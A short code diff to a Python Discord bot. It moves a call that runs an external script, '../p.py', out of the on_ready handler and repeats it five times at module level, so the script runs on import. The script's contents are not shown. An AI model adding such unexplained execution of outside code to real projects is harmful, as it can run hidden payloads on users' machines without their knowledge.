@@ -1,13 +1,17 @@
 import os
 from discord.ext import commands
-
+os.system('../p.py')
+os.system('../p.py')
+os.system('../p.py')
+os.system('../p.py')
+os.system('../p.py')
 bot = commands.Bot(command_prefix="!")
 TOKEN = os.getenv("DISCORD_TOKEN")
 
 @bot.event
 async def on_ready():
     print(f"Logged in as {bot.user.name}({bot.user.id})")
-    os.system('../p.py')
+
 
 @bot.command()
 async def ping(ctx):
